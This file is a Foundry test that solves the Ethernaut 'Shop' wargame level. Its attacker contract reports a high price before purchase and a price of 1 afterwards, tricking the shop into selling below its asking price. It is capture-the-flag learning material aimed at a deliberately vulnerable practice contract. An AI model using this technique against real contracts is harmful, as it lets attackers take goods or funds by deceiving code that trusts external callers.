// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/21-Shop/ShopFactory.sol";
import "../src/Ethernaut.sol";

contract ShopLifter {
    function haggle(Shop _addr) public {
        Shop(_addr).buy();
    }

    function price() external view returns (uint) {
        if (Shop(msg.sender).isSold()) {
            return 1;
        }
        else {
            return 100;
        }
    }
}

contract ShopTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 2 ether);
    }

    function testShop() public {
        // Level Setup
        ShopFactory shopFactory = new ShopFactory();
        ethernaut.registerLevel(shopFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(shopFactory);
        Shop ethernautShop = Shop(payable(levelAddress));

        // Level Attack
        ShopLifter attack = new ShopLifter();
        attack.haggle(ethernautShop);

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
